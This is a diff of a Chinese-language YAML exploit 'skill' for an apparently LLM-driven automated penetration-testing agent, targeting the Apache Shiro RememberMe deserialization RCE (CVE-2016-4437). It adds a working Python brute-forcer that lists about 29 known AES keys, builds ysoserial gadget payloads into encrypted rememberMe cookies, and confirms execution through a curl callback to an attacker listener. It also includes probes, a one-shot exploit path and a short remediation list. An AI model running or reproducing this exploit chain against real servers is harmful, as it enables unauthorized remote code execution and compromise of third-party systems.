@@ -1,35 +1,44 @@
 # ═══════════════════════════════════════════════════════════
-# Apache Shiro RememberMe 反序列化 RCE
+# Apache Shiro RememberMe 反序列化 RCE (CVE-2016-4437)
 #
-# 原理: Shiro 用硬编码 AES 密钥加密 RememberMe Cookie
-#       攻击者用已知密钥构造恶意序列化对象 → 服务端解密反序列化 → RCE
-# 关键变量: AES 密钥（默认 or 泄露）、可用的 gadget chain
+# 原理: Shiro 用 AES 密钥加密 RememberMe Cookie 中的序列化对象
+#       攻击者用已知密钥 + ysoserial gadget 构造恶意 Cookie → RCE
+# 关键: JDK 8 运行 ysoserial（JDK 21 大部分 gadget 生成失败）
 # ═══════════════════════════════════════════════════════════
 skill_id: shiro_rce
 name: "Apache Shiro RememberMe 反序列化 RCE"
 category: java_deserialization
-version: "1.0"
+version: "3.0"
 
 principle: |
-  Apache Shiro 的 RememberMe 功能使用 AES-CBC 加密序列化的用户身份信息，
-  存储在 Cookie 中。漏洞根因是 1.2.4 及更早版本使用硬编码的 AES 密钥
-  （kPH+bIxk5D2deZiIxcaaaA==）。
+  Apache Shiro 的 RememberMe 功能使用 AES 加密序列化的用户身份信息。
   
-  攻击流程:
-  1. 用已知密钥 + ysoserial gadget 生成恶意序列化 payload
-  2. AES-CBC 加密 → Base64 编码
-  3. 设置为 rememberMe Cookie 发送
-  4. 服务端解密 → 反序列化 → 触发 gadget chain → RCE
+  漏洞根因：
+  - Shiro 1.2.4 及更早版本使用硬编码 AES 密钥 kPH+bIxk5D2deZiIxcaaaA==
+  - 大量项目使用了其他已知/泄露的密钥
   
-  检测方法:
-  - 发送无效 rememberMe Cookie，响应 Set-Cookie 中出现 rememberMe=deleteMe
-    说明 Shiro 存在（不一定有漏洞，但值得进一步测试）
+  完整利用链：
+  1. 用 ysoserial（必须 JDK 8 运行）生成 gadget chain 序列化字节流
+  2. 随机 16 字节 IV
+  3. AES-CBC(key, IV, PKCS5Padding(serialized_payload)) 加密
+  4. Base64(IV + ciphertext) 编码
+  5. 设置为 rememberMe Cookie 发送
   
-  变量:
-  - AES 密钥: 默认密钥 or 常见泄露密钥（约 20 个常见密钥）
-  - Gadget chain: CommonsBeanutils1、CommonsCollections 系列、URLDNS 等
-    取决于目标 classpath 中有哪些库
-  - 加密模式: CBC（经典）或 GCM（1.4.2+）
+  密钥判定逻辑：
+  - 密钥错误 → 解密失败 → 返回 rememberMe=deleteMe
+  - 密钥正确但 gadget 不匹配 classpath → 反序列化异常 → 也返回 deleteMe
+  - 密钥正确且 gadget 匹配 → 正常处理（无 deleteMe）→ 命令被执行
+  
+  所以 "密钥是否正确" 不能只看 deleteMe，需要遍历 密钥×gadget 全组合。
+  
+  常见 gadget chain 及依赖：
+  - CommonsBeanutils1: 需要 commons-beanutils（Shiro 自带，最常命中）
+  - CommonsCollections1~6: 需要 commons-collections 3.x
+  - CommonsCollections7: 需要 commons-collections 3.x + JDK 8
+  
+  关键约束：ysoserial 必须用 JDK 8 运行。JDK 9+ 的模块系统导致
+  大部分 gadget 生成失败（CommonsBeanutils1、CC2 等全部报错）。
+  toolbox 环境变量 JAVA8 指向 JDK 8 路径。
 
 match:
   rules:
@@ -38,125 +47,338 @@ match:
     - evidence_contains: ["rememberMe=deleteMe"]
     - evidence_contains: ["shiro"]
     - cve_matches: ["CVE-2016-4437"]
+    - cve_matches: ["CVE-2020-1957"]
 
 probes:
   - id: confirm_shiro
-    description: "发送无效 rememberMe Cookie 确认 Shiro 框架"
+    description: "确认 Shiro 框架存在"
     command: |
-      curl -s -D - -o /dev/null {ENDPOINT} \
+      echo "=== Shiro 探测 ==="
+      response=$(curl -s -D - -o /dev/null {ENDPOINT} \
         -H "Cookie: rememberMe=invalid_base64_token_test" \
-        --max-time 10
+        --max-time 10 2>&1)
+      echo "$response"
+      if echo "$response" | grep -qi "rememberMe=deleteMe"; then
+        echo "SHIRO_CONFIRMED=true"
+      fi
+      if echo "$response" | grep -qi "JSESSIONID\|Set-Cookie"; then
+        echo "HAS_SESSION=true"
+      fi
     timeout: 15
     parse_rules:
-      - if_contains: ["rememberMe=deleteMe"]
+      - if_contains: ["SHIRO_CONFIRMED=true"]
         set: { shiro_confirmed: true }
-      - if_contains: ["Set-Cookie"]
-        set: { has_cookies: true }
+      - if_contains: ["HAS_SESSION=true"]
+        set: { has_session: true }
 
-  - id: find_login_endpoint
-    description: "探测登录接口（Shiro 通常保护登录页面）"
+  - id: detect_shiro_version
+    description: "通过 Cookie 行为推断 Shiro 版本（CBC vs GCM）"
     depends_on: { shiro_confirmed: true }
     steps:
       - command: |
-          for path in /login /doLogin /auth /user/login /admin/login /api/login /signin ""; do
-            code=$(curl -s -o /dev/null -w "%{http_code}" {ENDPOINT}${path} --max-time 5 2>/dev/null)
-            if [ "$code" = "200" ] || [ "$code" = "302" ]; then
-              echo "LOGIN_FOUND:${path}:${code}"
-            fi
-          done
+          # CBC 模式: 短 payload 也会触发 deleteMe
+          # GCM 模式: 需要特定格式才触发
+          short_resp=$(curl -s -D - -o /dev/null {ENDPOINT} \
+            -H "Cookie: rememberMe=AAAAAAAAAAAAAAAAAAAAAA==" \
+            --max-time 10 2>&1)
+          if echo "$short_resp" | grep -qi "rememberMe=deleteMe"; then
+            echo "SHIRO_RESPONDED_DELETEME"
+          else
+            echo "SHIRO_NO_DELETEME_FOR_SHORT"
+          fi
         parse_rules:
-          - if_regex: "LOGIN_FOUND:([^:]+):(\\d+)"
-            set: { login_path_found: true }
+          - if_contains: ["SHIRO_RESPONDED_DELETEME"]
+            set: { likely_cbc: true }
+
+  - id: check_java8
+    description: "检查 toolbox 中 JDK 8 是否可用，记录路径"
+    depends_on: { shiro_confirmed: true }
+    command: |
+      # 自动探测 JDK 8 路径（docker run 不读 /etc/profile.d）
+      FOUND=""
+      for p in \
+        /usr/lib/jvm/java-8/bin/java \
+        /usr/lib/jvm/java-8-openjdk-amd64/bin/java \
+        /usr/lib/jvm/java-1.8.0/bin/java \
+        /usr/lib/jvm/temurin-8/bin/java \
+        /usr/lib/jvm/adoptopenjdk-8-hotspot-amd64/bin/java \
+      ; do
+        if [ -x "$p" ]; then
+          ver=$($p -version 2>&1 | head -1)
+          echo "JAVA8_PATH:$p"
+          echo "JAVA8_VER:$ver"
+          FOUND="yes"
+          break
+        fi
+      done
+      [ -z "$FOUND" ] && echo "JAVA8_MISSING"
+    timeout: 10
+    parse_rules:
+      - if_regex: "JAVA8_PATH:(.+)"
+        set: { java8_available: true }
+      - if_contains: ["JAVA8_MISSING"]
+        set: { java8_available: false }
 
 exploit_paths:
-  # ═══ 路径 A: 一键脚本（遍历密钥 + gadget）═══
+  # ═══ 路径 A: shiro_exploit.py 一键脚本 ═══
   - path_id: shiro_script
     name: "shiro_exploit.py 一键利用"
     priority: 1
     principle: |
-      使用预置脚本自动遍历 15+ 常见密钥和多种 gadget chain，
-      发送 rememberMe Cookie，通过延迟/报错判断是否成功。
-      不需要回连，在目标本地执行命令。
+      使用预装脚本遍历密钥+gadget组合。
+      脚本需要用 JDK 8 运行 ysoserial。
     conditions:
       shiro_confirmed: true
     steps:
       - id: shiro_auto
-        description: "自动遍历密钥和 gadget chain 执行命令"
-        command: "python3 /opt/shiro_exploit.py {ENDPOINT} id"
-        timeout: 120
+        description: "shiro_exploit.py 自动遍历"
+        command: "python3 /opt/shiro_exploit.py {ENDPOINT} id 2>&1"
+        timeout: 300
         success_criteria:
           stdout_contains_any: ["uid=", "SUCCESS", "gid="]
         on_success: shiro_confirm
-        on_fail: shiro_manual_keys
+        on_fail: next_path
 
       - id: shiro_confirm
-        description: "确认用户身份"
-        command: "python3 /opt/shiro_exploit.py {ENDPOINT} whoami"
+        description: "确认 RCE 用户身份"
+        command: "python3 /opt/shiro_exploit.py {ENDPOINT} whoami 2>&1"
         timeout: 120
         success_criteria:
           stdout_not_empty: true
         on_success: conclude_success
         evidence_capture:
           current_user: stdout
-          shell_type: "rce_shiro_deserial"
+          shell_type: "rce_shiro_auto"
 
-      - id: shiro_manual_keys
-        description: "用默认密钥手工构造 payload（脚本失败时兜底）"
-        command: |
-          python3 -c "
-          import subprocess, sys
-          keys = [
-              'kPH+bIxk5D2deZiIxcaaaA==',
-              '4AvVhmFLUs0KTA3Kprsdag==',
-              '3AvVhmFLUs0KTA3Kprsdag==',
-              'Z3VucwAAAAAAAAAAAAAAAA==',
-              'wGiHplamyXlVB11UXWol8g==',
-              'fCq+/xW488hMTCD+cmJ3aQ==',
-          ]
-          for key in keys:
-              r = subprocess.run(
-                  ['python3', '/opt/shiro_exploit.py', '{ENDPOINT}', 'id', '--key', key],
-                  capture_output=True, text=True, timeout=30
-              )
-              if 'uid=' in r.stdout:
-                  print(f'KEY_FOUND:{key}')
-                  print(r.stdout)
-                  sys.exit(0)
-          print('ALL_KEYS_FAILED')
-          "
-        timeout: 180
-        success_criteria:
-          stdout_contains_any: ["uid=", "KEY_FOUND"]
-        on_success: conclude_success
-        on_fail: next_path
-        evidence_capture:
-          shell_type: "rce_shiro_manual"
-
-  # ═══ 路径 B: JNDI + Shiro（需回连）═══
-  - path_id: shiro_jndi
-    name: "Shiro + JNDI 远程类加载"
+  # ═══ 路径 B: JDK 8 回调检测暴破 ═══
+  - path_id: manual_jdk8_brute
+    name: "JDK 8 ysoserial 回调检测暴破"
     priority: 2
     principle: |
-      用 ysoserial 的 JNDI gadget 构造 payload，通过 Shiro 反序列化
-      触发 JNDI 查找。需要回连但 gadget chain 要求更低。
+      Java 的 Runtime.exec() 是非阻塞的——启动子进程后立即返回，不等待完成。
+      所以 "sleep 3" 不会导致 HTTP 响应延迟，延时盲注对 ysoserial 无效。
+
+      正确方法：网络回调检测
+      1. 在 toolbox 内启动一个临时 HTTP 监听器（nc）
+      2. 用 ysoserial 生成 "curl http://LHOST:PORT/confirm" 的 payload
+      3. AES-CBC 加密后作为 rememberMe Cookie 发送
+      4. 等几秒后检查监听器是否收到回调
+      5. 收到回调 = 密钥+gadget 正确 + RCE 确认
+
+      优先级：默认密钥 + CB1（Shiro 自带 commons-beanutils）排第一
     conditions:
       shiro_confirmed: true
-      env.can_reverse: true
     steps:
-      - id: shiro_jndi_exploit
-        description: "Shiro rememberMe + JNDI 利用"
-        command: "python3 /opt/shiro_exploit.py {ENDPOINT} id --mode jndi --lhost {LHOST}"
-        timeout: 120
+      - id: jdk8_callback_brute
+        description: "回调检测: curl 到 LHOST 确认 RCE（密钥 × gadget）"
+        publish_ports: [39876]
+        command: |
+          python3 << 'INNEREOF'
+          import subprocess, base64, os, sys, time, glob, socket, threading
+
+          TARGET = "{ENDPOINT}"
+          LHOST = os.getenv("LHOST", "")
+          YSOSERIAL = "/opt/ysoserial.jar"
+          CALLBACK_PORT = 39876
+
+          # 回调地址用 LHOST（宿主机 IP），端口通过 -p 映射到容器
+          # 目标 → curl LHOST:39876 → docker 端口映射 → 容器 0.0.0.0:39876
+          if not LHOST or LHOST.startswith("127."):
+              print("[!] LHOST 未设置或为 127.x，回调不可用")
+              print("ALL_COMBINATIONS_FAILED")
+              sys.exit(1)
+
+          CALLBACK_HOST = LHOST
+          print(f"[*] 回调地址: {CALLBACK_HOST}:{CALLBACK_PORT} (通过 docker -p 映射)")
+
+          # ── 自动探测 JDK 8 ──
+          JAVA8 = None
+          for p in [
+              "/usr/lib/jvm/java-8/bin/java",
+              "/usr/lib/jvm/java-8-openjdk-amd64/bin/java",
+          ] + glob.glob("/usr/lib/jvm/java-8*/bin/java"):
+              if os.path.isfile(p) and os.access(p, os.X_OK):
+                  JAVA8 = p
+                  break
+          if not JAVA8:
+              JAVA8 = os.getenv("JAVA8", "java")
+
+          KEYS = [
+              "kPH+bIxk5D2deZiIxcaaaA==",
+              "4AvVhmFLUs0KTA3Kprsdag==",
+              "3AvVhmFLUs0KTA3Kprsdag==",
+              "2AvVhdsgUs0FSA3SDFAdag==",
+              "Z3VucwAAAAAAAAAAAAAAAA==",
+              "wGiHplamyXlVB11UXWol8g==",
+              "fCq+/xW488hMTCD+cmJ3aQ==",
+              "1QWLxg+NYmxraMoxAXu/Iw==",
+              "L7RioUULEFhRyxM7a2R/Yg==",
+              "r0e3c16IdVkouZgk1TKVMg==",
+              "6ZmI6I2j5Y+R5aSn5ZOlAA==",
+              "5aaC5qKm5oqA5pyvAAAAAA==",
+              "bWicP0XBL7iLRfMSYSSZnQ==",
+              "WcfHGU25gNnTxTlmJMeSpw==",
+              "ClLk69oNcA3m+s0jIMIkpg==",
+              "Is9zJ3pzNh2cgTHB4ua3+Q==",
+              "U3ByaW5nQmxhZGUAAAAAAA==",
+              "R29vZCBsdWNrISEhISEhISE=",
+              "NsZXjXVklWPZwOfkvk6kUA==",
+              "GAevYnznvgNCURavBhCr1w==",
+              "aU1pcmFjbGVpTWlyYWNsZQ==",
+              "ZUdsaGJFshHKlBDbLRvSTw==",
+              "SDKOLKn2J1j/2BHjeZwAoQ==",
+              "tiVV6g3uZBGfhUGUzwIImQ==",
+              "cmVtZW1iZXJNZQAAAAAAAA==",
+              "66v1O8keKNV3TTcGPK1wzg==",
+              "bXRvbnMAAAAAAAAAAAAAAA==",
+              "a2VlcE9uR29pbmdBbmRGaQ==",
+              "Bf7MfkNR0axGGpZDB1bABw==",
+          ]
+
+          GADGETS = [
+              "CommonsBeanutils1",
+              "CommonsCollections2",
+              "CommonsCollections1",
+              "CommonsCollections6",
+              "CommonsCollections3",
+          ]
+
+          def validate_key(k):
+              try:
+                  return len(base64.b64decode(k)) == 16
+              except:
+                  return False
+
+          def aes_encrypt(key_b64, data):
+              try:
+                  from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+                  from cryptography.hazmat.primitives import padding as sym_padding
+                  key = base64.b64decode(key_b64)
+                  iv = os.urandom(16)
+                  padder = sym_padding.PKCS7(128).padder()
+                  padded = padder.update(data) + padder.finalize()
+                  cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+                  enc = cipher.encryptor()
+                  ct = enc.update(padded) + enc.finalize()
+                  return base64.b64encode(iv + ct).decode()
+              except Exception as e:
+                  print(f"[!] 加密失败: {e}", file=sys.stderr)
+                  return None
+
+          def send_payload(target, cookie):
+              try:
+                  subprocess.run(
+                      ["curl", "-s", "-o", "/dev/null",
+                       target, "-H", f"Cookie: rememberMe={cookie}",
+                       "--max-time", "8"],
+                      capture_output=True, timeout=12
+                  )
+              except:
+                  pass
+
+          # ── 回调监听器 ──
+          callback_received = threading.Event()
+          callback_data = {}
+
+          def callback_listener(port, timeout=5):
+              """在指定端口监听回调，收到连接设置 event"""
+              try:
+                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                  sock.settimeout(timeout)
+                  sock.bind(("0.0.0.0", port))
+                  sock.listen(1)
+                  conn, addr = sock.accept()
+                  data = conn.recv(1024)
+                  conn.sendall(b"HTTP/1.0 200 OK\r\n\r\nok")
+                  conn.close()
+                  sock.close()
+                  callback_data["from"] = addr
+                  callback_data["data"] = data.decode(errors="replace")[:200]
+                  callback_received.set()
+              except socket.timeout:
+                  sock.close()
+              except Exception as e:
+                  try: sock.close()
+                  except: pass
+
+          # ── 检查环境 ──
+          print(f"[*] JDK 8: {JAVA8}")
+          print(f"[*] 目标: {TARGET}")
+          print(f"[*] 回调地址: {CALLBACK_HOST}:{CALLBACK_PORT}")
+
+          valid_keys = [k for k in KEYS if validate_key(k)]
+          print(f"[*] 有效密钥: {len(valid_keys)}, Gadget: {len(GADGETS)}")
+          sys.stdout.flush()
+
+          # ── 逐个组合测试（每个组合启动临时监听器）──
+          total = len(valid_keys) * len(GADGETS)
+          tested = 0
+          found = False
+
+          for key in valid_keys:
+              if found:
+                  break
+              for gadget in GADGETS:
+                  tested += 1
+                  tag = f"shiro_{tested}"
+                  cmd = f"curl http://{CALLBACK_HOST}:{CALLBACK_PORT}/{tag}"
+
+                  # 生成 payload
+                  r = subprocess.run(
+                      [JAVA8, "-jar", YSOSERIAL, gadget, cmd],
+                      capture_output=True, timeout=15
+                  )
+                  if r.returncode != 0 or not r.stdout or len(r.stdout) < 100:
+                      continue
+
+                  cookie = aes_encrypt(key, r.stdout)
+                  if not cookie:
+                      continue
+
+                  # 启动回调监听
+                  callback_received.clear()
+                  listener = threading.Thread(
+                      target=callback_listener,
+                      args=(CALLBACK_PORT, 5),
+                      daemon=True
+                  )
+                  listener.start()
+                  time.sleep(0.2)  # 等监听器就绪
+
+                  # 发送 payload
+                  send_payload(TARGET, cookie)
+
+                  # 等待回调（最多 4 秒）
+                  listener.join(timeout=4)
+
+                  if callback_received.is_set():
+                      print(f"\n[!!!] CALLBACK_RCE_CONFIRMED")
+                      print(f"[!!!] KEY={key}")
+                      print(f"[!!!] GADGET={gadget}")
+                      print(f"[!!!] 回调来自: {callback_data.get('from', '?')}")
+                      found = True
+                      break
+
+                  if tested % 5 == 0:
+                      print(f"[*] 进度: {tested}/{total} ({key[:8]}...×{gadget})")
+                      sys.stdout.flush()
+
+          if not found:
+              print(f"\n[*] 全部 {tested} 个组合测试完毕，无回调")
+              print("ALL_COMBINATIONS_FAILED")
+          INNEREOF
+        timeout: 600
         success_criteria:
-          stdout_contains_any: ["uid=", "SUCCESS"]
+          stdout_contains_any: ["CALLBACK_RCE_CONFIRMED"]
         on_success: conclude_success
         on_fail: next_path
         evidence_capture:
-          shell_type: "rce_shiro_jndi"
+          shell_type: "rce_shiro_callback"
 
-  # ═══ 路径 C: LLM 兜底 ═══
+  # ═══ 路径 C: LLM 兜底（严格限定在 Shiro 范围内）═══
   - path_id: llm_freeform
-    name: "LLM 自由推理"
+    name: "LLM 自由推理（限定 Shiro 漏洞范围）"
     priority: 99
     mode: react_freeform
     max_rounds: 5
@@ -164,7 +386,8 @@ exploit_paths:
       shiro_confirmed: true
 
 remediation: |
-  1. 升级 Shiro 至 1.6.0+ 并配置随机 AES 密钥
-  2. 不要使用默认密钥，在 shiro.ini 或 Spring 配置中设置强随机密钥
-  3. 升级 commons-beanutils、commons-collections 等依赖
+  1. 升级 Shiro 至 1.6.0+ 并配置强随机 AES 密钥
+  2. 不要使用默认密钥 kPH+bIxk5D2deZiIxcaaaA==
+  3. 升级 commons-beanutils、commons-collections 等反序列化依赖
   4. 考虑禁用 rememberMe 功能或缩短有效期
+  5. 配置 WAF 拦截超长 Cookie 值
